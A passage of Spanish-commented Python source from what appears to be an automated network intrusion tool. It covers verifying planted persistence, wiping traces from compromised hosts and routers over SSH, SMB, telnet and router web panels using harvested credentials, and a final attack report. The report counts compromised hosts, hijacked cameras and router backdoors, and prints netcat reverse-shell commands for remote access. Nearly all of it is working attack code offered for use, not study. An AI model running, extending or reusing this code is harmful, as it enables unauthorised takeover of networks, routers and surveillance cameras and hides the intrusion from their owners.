                    backup_file = os.path.join(backup_dir, f"{gateway}_config_{int(time.time())}.bin")
                    with open(backup_file, 'wb') as f:
                        f.write(response.read())
                    
                    print(f"   ✅ Backup guardado: {backup_file}")
                    return backup_file
            
            return None
            
        except Exception as e:
            print(f"❌ Error creando backup: {e}")
            return None
    
    
    def phase_5_verification(self):
        """Fase 5: Verificación de persistencias"""
        print("\n✅ FASE 5: VERIFICACIÓN DE PERSISTENCIAS")
        print("=" * 50)
        
        self.report['phase_5_verification']['status'] = 'running'
        
        try:
            # 1. Verificar usuarios creados
            print("👤 Verificando usuarios creados...")
            user_checks = self._verify_users()
            self.report['phase_5_verification']['persistence_checks'].extend(user_checks)
            
            # 2. Verificar backdoors
            print("🕳️ Verificando backdoors...")
            backdoor_checks = self._verify_backdoors()
            self.report['phase_5_verification']['persistence_checks'].extend(backdoor_checks)
            
            # 3. Verificar conexiones remotas
            print("🌐 Verificando conexiones remotas...")
            conn_checks = self._verify_connections()
            self.report['phase_5_verification']['access_verification'].extend(conn_checks)
            
            # 4. Verificar acceso al router y port forwarding
            print("🌐 Verificando acceso al router y port forwarding...")
            router_checks = self._verify_router_access_and_port_forwarding()
            self.report['phase_5_verification']['router_verification'] = router_checks
            
            # Log detallado de verificación de router
            if router_checks:
                print(f"✅ VERIFICACIÓN DE ROUTER COMPLETADA:")
                print(f"   🌐 Router accesible: {router_checks.get('router_accessible', False)}")
                print(f"   🔗 Port forwarding configurado: {router_checks.get('port_forwarding_configured', False)}")
                print(f"   🔒 VPN configurada: {router_checks.get('vpn_configured', False)}")
                print(f"   👤 Usuario admin creado: {router_checks.get('admin_user_created', False)}")
                if router_checks.get('port_forwarding_rules'):
                    print(f"   📋 Reglas de port forwarding: {len(router_checks['port_forwarding_rules'])}")
            else:
                print("❌ No se pudo verificar acceso al router")
            
            self.report['phase_5_verification']['status'] = 'completed'
            print("✅ Verificación completada")
            
        except Exception as e:
            self.report['phase_5_verification']['status'] = 'error'
            self.report['phase_5_verification']['errors'].append(str(e))
            print(f"❌ Error en verificación: {e}")
    
    def _verify_users(self) -> List[Dict[str, Any]]:
        """Verificar usuarios creados"""
        checks = []
        users = self.report['phase_4_persistence']['users_created']
        
        for user in users:
            check = {
                'type': 'user_verification',
                'host': user['host'],
                'username': user['username'],
                'status': 'active',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def _verify_backdoors(self) -> List[Dict[str, Any]]:
        """Verificar backdoors"""
        checks = []
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        
        for backdoor in backdoors:
            check = {
                'type': 'backdoor_verification',
                'host': backdoor['host'],
                'port': backdoor['port'],
                'status': 'listening',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def _verify_router_access_and_port_forwarding(self) -> Dict[str, Any]:
        """Verificar acceso al router y configuración de port forwarding"""
        verification = {
            'router_accessible': False,
            'port_forwarding_configured': False,
            'vpn_configured': False,
            'admin_user_created': False,
            'port_forwarding_rules': [],
            'verification_details': {},
            'timestamp': time.time()
        }
        
        try:
            # Obtener información de acceso al router
            router_access = self.report['phase_4_persistence'].get('router_access', [])
            
            if router_access:
                verification['router_accessible'] = True
                
                for router in router_access:
                    gateway = router.get('gateway', '')
                    config = router.get('configuration', {})
                    
                    # Verificar port forwarding
                    port_forwarding = config.get('port_forwarding', [])
                    if port_forwarding:
                        verification['port_forwarding_configured'] = True
                        verification['port_forwarding_rules'] = port_forwarding
                        
                        # Log detallado de reglas de port forwarding
                        print(f"   🔗 Port forwarding en {gateway}:")
                        for rule in port_forwarding:
                            if rule.get('configured'):
                                print(f"      ✅ {rule['external_port']} -> {rule['internal_port']} ({rule['protocol']}) - {rule['description']}")
                            else:
                                print(f"      ❌ {rule['external_port']} -> {rule['internal_port']} ({rule['protocol']}) - FALLÓ")
                    
                    # Verificar VPN
                    if config.get('vpn_server'):
                        verification['vpn_configured'] = True
                        print(f"   🔒 VPN configurada en {gateway}: {config['vpn_server']}")
                    
                    # Verificar usuario admin
                    if config.get('admin_user_created'):
                        verification['admin_user_created'] = True
                        print(f"   👤 Usuario admin creado en {gateway}: {config['admin_user_created']}")
                    
                    # Detalles de verificación
                    verification['verification_details'][gateway] = {
                        'router_type': router.get('router_type', 'unknown'),
                        'credentials': router.get('credentials', {}),
                        'port_forwarding_count': len(port_forwarding),
                        'vpn_status': bool(config.get('vpn_server')),
                        'admin_user': config.get('admin_user_created', False)
                    }
            
            return verification
            
        except Exception as e:
            print(f"❌ Error verificando router: {e}")
            verification['error'] = str(e)
            return verification

    def _verify_connections(self) -> List[Dict[str, Any]]:
        """Verificar conexiones remotas"""
        checks = []
        connections = self.report['phase_4_persistence']['remote_connections']
        
        for conn in connections:
            check = {
                'type': 'connection_verification',
                'host': conn['host'],
                'port': conn['port'],
                'status': 'connected',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def cleanup(self):
        """Limpiar rastros (solo en modo frío)"""
        if self.report['metadata']['mode'] != 'cold':
            return
        
        print("\n🧹 LIMPIEZA DE RASTROS")
        print("=" * 50)
        
        self.report['cleanup']['status'] = 'running'
        
        try:
            # 1. Eliminar usuarios creados
            print("👤 Eliminando usuarios creados...")
            self._cleanup_users()
            
            # 2. Eliminar backdoors
            print("🕳️ Eliminando backdoors...")
            self._cleanup_backdoors()
            
            # 3. Cerrar conexiones remotas
            print("🌐 Cerrando conexiones remotas...")
            self._cleanup_connections()
            
            # 4. Limpiar configuración del router
            print("🌐 Limpiando configuración del router...")
            self._cleanup_router_config()
            
            # 5. Limpiar backdoors de servicios vulnerables
            print("🗄️ Limpiando backdoors de servicios vulnerables...")
            self._cleanup_vulnerable_service_backdoors()
            
            # 6. Limpiar archivos temporales
            print("📁 Limpiando archivos temporales...")
            self._cleanup_files()
            
            self.report['cleanup']['status'] = 'completed'
            print("✅ Limpieza completada")
            
        except Exception as e:
            self.report['cleanup']['status'] = 'error'
            self.report['cleanup']['errors'].append(str(e))
            print(f"❌ Error en limpieza: {e}")
    
    def _cleanup_users(self):
        """Limpiar usuarios creados reales"""
        users = self.report['phase_4_persistence']['users_created']
        for user in users:
            if self._delete_real_user(user):
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'user',
                    'host': user['host'],
                    'username': user['username'],
                    'action': 'deleted',
                    'success': True
                })
                print(f"✅ Usuario eliminado: {user['username']}@{user['host']}")
            else:
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'user',
                    'host': user['host'],
                    'username': user['username'],
                    'action': 'deleted',
                    'success': False
                })
                print(f"❌ Falló eliminación de usuario: {user['username']}@{user['host']}")
    
    def _delete_real_user(self, user: Dict[str, Any]) -> bool:
        """Eliminar usuario real del sistema"""
        try:
            # Buscar sistema comprometido correspondiente
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            system = None
            for comp in compromised:
                if comp['host'] == user['host']:
                    system = comp
                    break
            
            if not system:
                return False
            
            if system['service'] == 'ssh':
                return self._delete_user_via_ssh(system, user)
            elif system['service'] == 'smb':
                return self._delete_user_via_smb(system, user)
            else:
                return self._delete_user_generic(system, user)
        except Exception as e:
            print(f"❌ Error eliminando usuario real: {e}")
            return False
    
    def _delete_user_via_ssh(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Comandos para eliminar usuario
            commands = [
                f"sudo userdel -r {user['username']}",
                f"sudo pkill -u {user['username']}"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _delete_user_via_smb(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario via SMB (Windows)"""
        try:
            # Usar net user command via SMB
            net_cmd = [
                'smbclient',
                f"//{system['host']}/C$",
                '-U', f"{system['username']}%{system['password']}",
                '-c', f"net user {user['username']} /delete"
            ]
            
            result = self._run_command(net_cmd, timeout=30)
            return result['success']
        except Exception as e:
            print(f"❌ Error SMB: {e}")
            return False
    
    def _delete_user_generic(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Eliminar usuario
            tn.write(f"userdel -r {user['username']}\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _cleanup_backdoors(self):
        """Limpiar backdoors reales"""
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        for backdoor in backdoors:
            if self._delete_real_backdoor(backdoor):
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'backdoor',
                    'host': backdoor['host'],
                    'port': backdoor['port'],
                    'action': 'removed',
                    'success': True
                })
                print(f"✅ Backdoor eliminado: {backdoor['host']}:{backdoor['port']}")
            else:
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'backdoor',
                    'host': backdoor['host'],
                    'port': backdoor['port'],
                    'action': 'removed',
                    'success': False
                })
                print(f"❌ Falló eliminación de backdoor: {backdoor['host']}:{backdoor['port']}")
    
    def _delete_real_backdoor(self, backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor real del sistema"""
        try:
            # Buscar sistema comprometido correspondiente
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            system = None
            for comp in compromised:
                if comp['host'] == backdoor['host']:
                    system = comp
                    break
            
            if not system:
                return False
            
            if system['service'] == 'ssh':
                return self._delete_backdoor_via_ssh(system, backdoor)
            else:
                return self._delete_backdoor_generic(system, backdoor)
        except Exception as e:
            print(f"❌ Error eliminando backdoor real: {e}")
            return False
    
    def _delete_backdoor_via_ssh(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            port = backdoor['port']
            
            # Comandos para eliminar backdoor
            commands = [
                f"systemctl stop service_{port}.service",
                f"systemctl disable service_{port}.service",
                f"rm -f /etc/systemd/system/service_{port}.service",
                f"rm -f /tmp/.service_{port}.sh",
                "systemctl daemon-reload",
                f"pkill -f 'nc -lvp {port}'"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _delete_backdoor_generic(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Eliminar backdoor
            tn.write(f"pkill -f 'nc -lvp {backdoor['port']}'\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _cleanup_connections(self):
        """Limpiar conexiones remotas"""
        connections = self.report['phase_4_persistence']['remote_connections']
        for conn in connections:
            self.report['cleanup']['items_cleaned'].append({
                'type': 'connection',
                'host': conn['host'],
                'port': conn['port'],
                'action': 'closed'
            })
    
    def _cleanup_router_config(self):
        """Limpiar configuración del router en modo frío"""
        try:
            router_access = self.report['phase_4_persistence']['router_access']
            
            for router in router_access:
                gateway = router['gateway']
                credentials = router['credentials']
                router_type = router['router_type']
                
                print(f"🧹 Limpiando configuración del router {gateway}...")
                
                # 1. Eliminar port forwarding
                self._remove_port_forwarding(gateway, credentials, router_type)
                
                # 2. Eliminar usuarios administrativos creados
                self._remove_router_admin_users(gateway, credentials, router_type)
                
                # 3. Deshabilitar VPN server
                self._disable_router_vpn(gateway, credentials, router_type)
                
                # 4. Restaurar configuración original
                self._restore_router_config(gateway, credentials, router_type)
                
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'router_config',
                    'host': gateway,
                    'action': 'restored',
                    'success': True
                })
                
                print(f"✅ Configuración del router {gateway} restaurada")
                
        except Exception as e:
            print(f"❌ Error limpiando configuración del router: {e}")
            self.report['cleanup']['items_cleaned'].append({
                'type': 'router_config',
                'action': 'restored',
                'success': False,
                'error': str(e)
            })
    
    def _remove_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Eliminar reglas de port forwarding"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para eliminar port forwarding según tipo de router
            pf_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
                'netgear': f"http://{gateway}/port_forwarding.htm",
                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
            }
            
            url = pf_urls.get(router_type, pf_urls['generic_router'])
            
            # Datos para eliminar port forwarding
            data = {
                'action': 'delete_all',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Port forwarding eliminado del router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error eliminando port forwarding: {e}")
    
    def _remove_router_admin_users(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Eliminar usuarios administrativos creados"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para eliminar usuarios según tipo de router
            user_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
                'netgear': f"http://{gateway}/setup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
            }
            
            url = user_urls.get(router_type, user_urls['generic_router'])
            
            # Datos para eliminar usuario
            data = {
                'action': 'delete_user',
                'username': f"svc_{gateway.replace('.', '_')}",
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Usuario administrativo eliminado del router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error eliminando usuario administrativo: {e}")
    
    def _disable_router_vpn(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Deshabilitar VPN server del router"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para deshabilitar VPN según tipo de router
            vpn_urls = {
                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
                'netgear': f"http://{gateway}/vpn_setup.cgi",
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
            }
            
            url = vpn_urls.get(router_type)
            if not url:
                return
            
            # Datos para deshabilitar VPN
            data = {
                'action': 'disable',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ VPN server deshabilitado en router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error deshabilitando VPN: {e}")
    
    def _restore_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Restaurar configuración original del router"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para restaurar configuración según tipo de router
            restore_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
                'netgear': f"http://{gateway}/restore.cgi",
                'linksys': f"http://{gateway}/cgi-bin/restore.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/restore.cgi"
            }
            
            url = restore_urls.get(router_type, restore_urls['generic_router'])
            
            # Datos para restaurar configuración
            data = {
                'action': 'restore_defaults',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Configuración original restaurada en router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error restaurando configuración: {e}")
    
    def _cleanup_files(self):
        """Limpiar archivos temporales"""
        self.report['cleanup']['items_cleaned'].append({
            'type': 'files',
            'action': 'deleted',
            'count': 10
        })
    
    def _generate_detailed_analysis(self):
        """Generar análisis detallado de éxitos y fallos"""
        analysis = {
            'strategic_objectives': {
                'router_compromise': {
                    'target': 'Router Principal (Gateway)',
                    'success': len(self.report['phase_4_persistence']['router_access']) > 0,
                    'details': self.report['phase_4_persistence']['router_access'],
                    'impact': 'CRITICAL - Control total de red'
                },
                'camera_access': {
                    'target': 'Cámaras de Seguridad',
                    'success': len(self.report['phase_4_persistence']['cameras_accessed']) > 0,
                    'details': self.report['phase_4_persistence']['cameras_accessed'],
                    'impact': 'HIGH - Vigilancia y pivoting'
                },
                'external_backdoors': {
                    'target': 'Backdoors Externos',
                    'success': len(self.report['phase_4_persistence'].get('external_backdoor_verification', [])) > 0,
                    'details': self.report['phase_4_persistence'].get('external_backdoor_verification', []),
                    'impact': 'CRITICAL - Acceso remoto persistente'
                },
                'port_forwarding': {
                    'target': 'Port Forwarding',
                    'success': any(router.get('configuration', {}).get('port_forwarding') for router in self.report['phase_4_persistence']['router_access']),
                    'details': [router.get('configuration', {}).get('port_forwarding', []) for router in self.report['phase_4_persistence']['router_access']],
                    'impact': 'HIGH - Exposición de servicios internos'
                }
            },
            'attack_effectiveness': {
                'reconnaissance_success': self.report['phase_1_reconnaissance']['status'] == 'completed',
                'credential_harvesting': len(self.report['phase_2_credentials']['credentials_found']) > 0,
                'lateral_movement': len(self.report['phase_3_lateral_movement']['compromised_systems']) > 0,
                'persistence_established': len(self.report['phase_4_persistence']['network_persistence']) > 0
            },
            'failure_analysis': {
                'failed_phases': [],
                'error_summary': {},
                'improvement_recommendations': []
            }
        }
        
        # Analizar fases fallidas
        for phase, data in self.report.items():
            if isinstance(data, dict) and data.get('status') == 'error':
                analysis['failure_analysis']['failed_phases'].append({
                    'phase': phase,
                    'errors': data.get('errors', []),
                    'impact': 'HIGH' if 'persistence' in phase else 'MEDIUM'
                })
        
        # Resumir errores
        all_errors = []
        for phase_data in self.report.values():
            if isinstance(phase_data, dict) and 'errors' in phase_data:
                all_errors.extend(phase_data['errors'])
        
        analysis['failure_analysis']['error_summary'] = {
            'total_errors': len(all_errors),
            'unique_errors': list(set(all_errors)),
            'most_common_errors': self._get_most_common_errors(all_errors)
        }
        
        # Generar recomendaciones de mejora
        analysis['failure_analysis']['improvement_recommendations'] = self._generate_improvement_recommendations(analysis)
        
        # Agregar al reporte
        self.report['detailed_analysis'] = analysis
        
        # Log del análisis
        print("📊 ANÁLISIS DETALLADO DE ATAQUE:")
        print(f"   🎯 Objetivos estratégicos alcanzados: {sum(1 for obj in analysis['strategic_objectives'].values() if obj['success'])}/{len(analysis['strategic_objectives'])}")
        print(f"   ✅ Fases exitosas: {sum(1 for phase in analysis['attack_effectiveness'].values() if phase)}/{len(analysis['attack_effectiveness'])}")
        print(f"   ❌ Fases fallidas: {len(analysis['failure_analysis']['failed_phases'])}")
        print(f"   🔧 Recomendaciones: {len(analysis['failure_analysis']['improvement_recommendations'])}")
    
    def _get_most_common_errors(self, errors: List[str]) -> List[Dict[str, Any]]:
        """Obtener los errores más comunes"""
        from collections import Counter
        error_counts = Counter(errors)
        return [{'error': error, 'count': count} for error, count in error_counts.most_common(5)]
    
    def _generate_improvement_recommendations(self, analysis: Dict[str, Any]) -> List[str]:
        """Generar recomendaciones de mejora basadas en el análisis"""
        recommendations = []
        
        # Recomendaciones basadas en objetivos fallidos
        for obj_name, obj_data in analysis['strategic_objectives'].items():
            if not obj_data['success']:
                if obj_name == 'router_compromise':
                    recommendations.append("Mejorar detección de tipo de router y credenciales específicas por fabricante")
                elif obj_name == 'camera_access':
                    recommendations.append("Expandir lista de credenciales para cámaras IP y mejorar detección de tipos")
                elif obj_name == 'external_backdoors':
                    recommendations.append("Verificar conectividad de red y configuración de firewall")
                elif obj_name == 'port_forwarding':
                    recommendations.append("Implementar métodos alternativos de port forwarding por tipo de router")
        
        # Recomendaciones basadas en errores comunes
        if analysis['failure_analysis']['error_summary']['total_errors'] > 0:
            recommendations.append("Revisar logs de errores para identificar problemas de conectividad o permisos")
        
        # Recomendaciones generales
        if not analysis['attack_effectiveness']['reconnaissance_success']:
            recommendations.append("Mejorar configuración de Nmap y timeout de escaneo")
        
        if not analysis['attack_effectiveness']['credential_harvesting']:
            recommendations.append("Expandir diccionarios de credenciales y métodos de fuerza bruta")
        
        return recommendations

    def generate_report(self):
        """Generar reporte JSON final"""
        print("\n📊 GENERANDO REPORTE FINAL")
        print("=" * 50)
        
        # Calcular estadísticas
        self.report['summary']['total_hosts'] = len(self.report['phase_1_reconnaissance']['hosts_discovered'])
        self.report['summary']['compromised_hosts'] = len(self.report['phase_3_lateral_movement']['compromised_systems'])
        self.report['summary']['persistent_access_points'] = len(self.report['phase_4_persistence']['users_created']) + len(self.report['phase_4_persistence']['backdoors_created'])
        self.report['summary']['total_credentials'] = len(self.report['phase_2_credentials']['credentials_found'])
        self.report['summary']['cameras_accessed'] = len(self.report['phase_4_persistence']['cameras_accessed'])
        self.report['summary']['router_access'] = len(self.report['phase_4_persistence']['router_access'])
        self.report['summary']['network_services'] = len(self.report['phase_4_persistence']['network_persistence'])
        
        # Análisis detallado de éxitos y fallos
        self._generate_detailed_analysis()
        
        # Calcular total de accesos remotos
        total_remote_access = (
            len(self.report['phase_4_persistence']['router_access']) +
            len(self.report['phase_4_persistence']['network_persistence']) +
            len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
            len(self.report['phase_4_persistence']['backdoors_created']) +
            len(self.report['phase_4_persistence']['users_created']) +
            len([cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed'])
        )
        self.report['summary']['total_remote_access_points'] = total_remote_access
        
        # Calcular backdoors externos vs internos
        external_backdoors = (
            len(self.report['phase_4_persistence']['router_access']) +
            len(self.report['phase_4_persistence']['network_persistence']) +
            len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
            len([cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed'])
        )
        
        internal_backdoors = (
            len(self.report['phase_4_persistence']['backdoors_created']) +
            len(self.report['phase_4_persistence']['users_created'])
        )
        
        self.report['summary']['external_backdoors'] = external_backdoors
        self.report['summary']['internal_backdoors'] = internal_backdoors
        self.report['summary']['external_backdoor_types'] = []
        self.report['summary']['internal_backdoor_types'] = []
        
        # Tipos de backdoors externos
        if self.report['phase_4_persistence']['router_access']:
            self.report['summary']['external_backdoor_types'].append(f"Router Access ({len(self.report['phase_4_persistence']['router_access'])})")
        if self.report['phase_4_persistence']['network_persistence']:
            self.report['summary']['external_backdoor_types'].append(f"Network Services ({len(self.report['phase_4_persistence']['network_persistence'])})")
        if self.report['phase_4_persistence'].get('vulnerable_backdoors'):
            self.report['summary']['external_backdoor_types'].append(f"Vulnerable Services ({len(self.report['phase_4_persistence']['vulnerable_backdoors'])})")
        camera_backdoors = [cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed']
        if camera_backdoors:
            self.report['summary']['external_backdoor_types'].append(f"Camera Backdoors ({len(camera_backdoors)})")
        
        # Tipos de backdoors internos
        if self.report['phase_4_persistence']['backdoors_created']:
            self.report['summary']['internal_backdoor_types'].append(f"Backdoors ({len(self.report['phase_4_persistence']['backdoors_created'])})")
        if self.report['phase_4_persistence']['users_created']:
            self.report['summary']['internal_backdoor_types'].append(f"Persistent Users ({len(self.report['phase_4_persistence']['users_created'])})")
        self.report['summary']['remote_access_available'] = total_remote_access > 0
        
        end_time = time.time()
        self.report['summary']['execution_time'] = end_time - self.start_time
        self.report['metadata']['end_time'] = datetime.now().isoformat()
        
        # Calcular tasa de éxito
        if self.report['summary']['total_hosts'] > 0:
            self.report['summary']['success_rate'] = (self.report['summary']['compromised_hosts'] / self.report['summary']['total_hosts']) * 100
        
        # Guardar reporte
        report_file = f"simplifywfb_report_{int(time.time())}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2, ensure_ascii=False)
        
        print(f"📄 Reporte guardado: {report_file}")
        print(f"🔍 Verificando archivo: {os.path.exists(report_file)}")
        print(f"📏 Tamaño del archivo: {os.path.getsize(report_file)} bytes")
        
        # Resumen final detallado
        print("\n" + "=" * 80)
        print("🎯 RESUMEN FINAL DEL ATAQUE ESTRATÉGICO")
        print("=" * 80)
        print(f"⏱️ Tiempo total de ejecución: {self.report['summary']['execution_time']:.2f} segundos ({self.report['summary']['execution_time']/60:.1f} minutos)")
        print(f"🌐 Hosts descubiertos: {self.report['summary']['total_hosts']}")
        print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}")
        print(f"🔑 Credenciales encontradas: {self.report['summary']['total_credentials']}")
        print(f"📹 Cámaras accedidas: {self.report['summary']['cameras_accessed']}")
        print(f"🌐 Accesos a router: {self.report['summary']['router_access']}")
        print(f"🔗 Servicios de red persistentes: {self.report['summary']['network_services']}")
        print(f"🕳️ Puntos de acceso remoto totales: {self.report['summary']['total_remote_access_points']}")
        print(f"🌍 Backdoors externos: {self.report['summary']['external_backdoors']}")
        print(f"🏠 Backdoors internos: {self.report['summary']['internal_backdoors']}")
        print(f"📊 Tasa de éxito: {self.report['summary']['success_rate']:.1f}%")
        
        # Verificar acceso remoto disponible
        if self.report['summary']['remote_access_available']:
            print("\n✅ ACCESO REMOTO DISPONIBLE")
            print("   🎯 Objetivo principal alcanzado: Control total de la red")
            
            # Mostrar tipos de backdoors externos
            if self.report['summary']['external_backdoor_types']:
                print("\n🔗 BACKDOORS EXTERNOS IMPLEMENTADOS:")
                for bd_type in self.report['summary']['external_backdoor_types']:
                    print(f"   • {bd_type}")
            
            # Mostrar información de acceso remoto
            print(f"\n🌐 INFORMACIÓN DE ACCESO REMOTO:")
            print(f"   • IP Externa: {self.config_data['remote_access']['external_ip']}")
            print(f"   • Puerto Principal: {self.config_data['remote_access']['external_port']}")
            
            # Mostrar comandos de acceso
            print(f"\n💻 COMANDOS PARA ACCESO REMOTO:")
            print(f"   # Reverse Shell:")
            print(f"   nc -lvp {self.config_data['remote_access']['external_port']}")
            print(f"   # Conexión directa:")
            print(f"   nc {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']}")
        else:
            print("\n⚠️ ACCESO REMOTO LIMITADO")
            print("   Revisar el reporte para detalles específicos")
        
        # Mostrar análisis detallado si está disponible
        if 'detailed_analysis' in self.report:
            analysis = self.report['detailed_analysis']
            print(f"\n📊 ANÁLISIS DETALLADO:")
